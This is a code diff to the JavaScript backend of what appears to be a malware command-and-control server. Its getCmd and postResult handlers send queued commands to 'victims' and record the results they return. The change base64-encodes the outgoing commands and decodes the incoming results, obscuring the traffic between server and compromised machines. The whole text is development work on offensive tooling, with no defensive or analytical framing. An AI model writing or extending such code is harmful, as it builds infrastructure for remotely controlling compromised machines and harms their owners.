@@ -74,14 +74,11 @@ async function getCmd(req, res) {
 		const latestCmd = victimCmdList[0];
 
 		obj.commandId = latestCmd._id;
-		obj.command = latestCmd.command;
+		obj.command = btoa(latestCmd.command);
 		obj.active = latestCmd.active;
 		obj.victimId = latestCmd.victimId;
 
-		return res.status(200).send({
-			status: true,
-			obj,
-		});
+		return res.status(200).send(obj);
 	} else {
 		console.log("No commands found for the victim.");
 		return res.status(400).send({
@@ -101,7 +98,7 @@ async function postResult(req, res) {
 	} else {
 		const commandResult = new mongodb.CommandResults({
 			commandId: sanitize(commandId),
-			result: sanitize(result),
+			result: atob(sanitize(result)),
 			victimId: sanitize(username),
 			resultRecievedOn: new Date(),
 		});
